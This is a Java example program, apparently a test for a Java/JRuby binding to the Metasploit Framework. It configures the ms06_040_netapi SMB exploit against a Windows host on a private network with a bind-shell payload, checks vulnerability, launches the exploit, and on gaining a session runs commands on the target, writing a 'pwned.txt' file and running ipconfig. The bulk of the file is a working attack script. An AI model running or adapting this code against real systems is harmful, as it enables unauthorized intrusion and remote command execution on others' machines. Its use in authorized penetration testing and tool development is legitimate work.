/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package org.metasploit.test;

import java.util.Map;
import java.util.Iterator;

import org.metasploit.simple.Console;

import org.metasploit.Metasploit;
import org.metasploit.framework.Framework;
import org.metasploit.framework.Exploit;
import org.metasploit.framework.Payload;
import org.metasploit.framework.Session;
import org.metasploit.framework.OptBase;

/**
 *
 * @author hughneale
 */
public class Example {

    public static void main(String args[]) throws Exception {

        Framework mfw = new Metasploit().Simple().Framework();

        mfw.banner(); // Print banner

        //Exploit exp = new Exploit("windows/smb/ms06_040_netapi");
        //Exploit exp = mfw.exploits().get("windows/smb/ms06_040_netapi");
       // exp.set("RHOST", "10.0.0.63");
        //exp.set("RPORT", 445);
       // exp.set("LHOST", "10.0.0.225");
        //exp.set("LPORT", 2356);

        //mfw.exploits().Windows();

       // System.out.println(exp.Name());
      //  System.out.println(exp.FullName());
      //  System.out.println(exp.ShortName());
      //  System.out.println(exp.Type());
      //  System.out.println(exp.RefName());
       // System.out.println(exp.RankToString());
      //  System.out.println(exp.RankToH());
        //exp.Rank();
        //System.out.println(exp.description());

        //Payload pay = new Payload("windows/meterpreter/reverse_tcp");
       // Payload pay = new Payload("windows/shell/bind_tcp");

        //System.out.println("\t\t" + mfw.config().config_file());

        //mfw.exploits().toString(); //lists exploits
        //mfw.payloads().toString(); //lists payloads
/*
        Options opts = mfw.options();

        opts.add("Payload", pay);
        opts.add("Options", exp.getOptions());
        //send.put("OptionStr", "RHOST=10.0.0.1,RPORT=21");
        opts.add("LocalInput", mfw.scriptlet("Rex::Ui::Text::Input::Stdio.new"));
        opts.add("LocalOutput", mfw.scriptlet("Rex::Ui::Text::Output::Stdio.new"));
        //send.put("RunAsJob", RubyBoolean.createTrueClass(quick));
        //send.put("Quiet", RubyBoolean.createFalseClass(quick));
        Session session = mfw.exploits().create_simple(mfw.exploits().create(exp), opts);
         */

        Exploit exp = mfw.exploits().create("windows/smb/ms06_040_netapi");
        Payload pay = mfw.payloads().create("windows/shell/bind_tcp");

        System.out.println(exp.Name());
        System.out.println(exp.FullName());
        System.out.println(exp.ShortName());
        System.out.println(exp.Type());
        System.out.println(exp.RefName());
        //System.out.println(exp.RankToString());
        System.out.println(exp.RankToH());
        System.out.println(exp.Compat());
        System.out.println(exp.Description());

        Map<String, OptBase> options = exp.Options();
        Iterator it = options.entrySet().iterator();

        while (it.hasNext()) {

            Map.Entry entry = (Map.Entry) it.next();
            String name = (String) entry.getKey();
            OptBase option = (OptBase) entry.getValue();

            //System.out.println(name + "   " + option.Name());

            if(option.Required()) {

                if(!option.Advanced()) {
                   
                    if(!option.Evasion()) {
                        System.out.println(name + "   " + option.Type());
                    }

                }
            }

        }

        System.out.println(exp.Share_DataStore());
        System.out.println(exp.Validate());

        exp.set("RHOST", "10.0.0.210");
        exp.set("RPORT", 445);
        exp.set("LHOST", "10.0.0.213");
        exp.set("LPORT", 2356);

        long state = exp.check();

        if(state == Exploit.SAFE) {
            Console.out("The target is not exploitable.");
        } else if(state == Exploit.DETECTED) {
            Console.out("The target service is running, but could not be validated.");
        } else if(state == Exploit.APPEARS) {
            Console.out("The target appears to be vulnerable.");
        } else if(state == Exploit.VULNERABLE) {
            Console.out("The target is vulnerable.");
        } else if(state == Exploit.UNSUPPORTED) {
            Console.out("This exploit does not support check.");
        }

        Session session = mfw.exploits().create(exp, pay);

        if (session == null) {
            System.out.println("\t\tNo session hooked.");
        } else {
            System.out.println("\t\tSession hooked, ");
            System.out.println("\t\tSession , " + session.inspect());
            System.out.println("\t\tSession , " + session.tunnel_to_s());
            // Connect with session
            session.run_cmd("echo jruby + msf > pwned.txt"); // pops into System32
            session.run_cmd("ipconfig");

            System.out.println("reading ..");

            session.shell_read(1000); // buffer
            //session.interact();

        }

        mfw.save_config();

        System.out.println("\t\t" + mfw.sessions().avaliable() + " session(s) avaliable.");

        mfw.sessions().toString();

        System.out.println();

        System.out.println(mfw.events().toString());
        System.out.println(mfw.database().toString());
        System.out.println(mfw.jobs().toString());


        for (int x = 0; x < 234; x++) {
            System.out.println("\t\t" + mfw.sessions().avaliable() + " session(s) avaliable.");
            Thread.sleep(10000);
        }

        //Thread.sleep(60000); // 1 minute w/e

        System.exit(-23);

    }
}
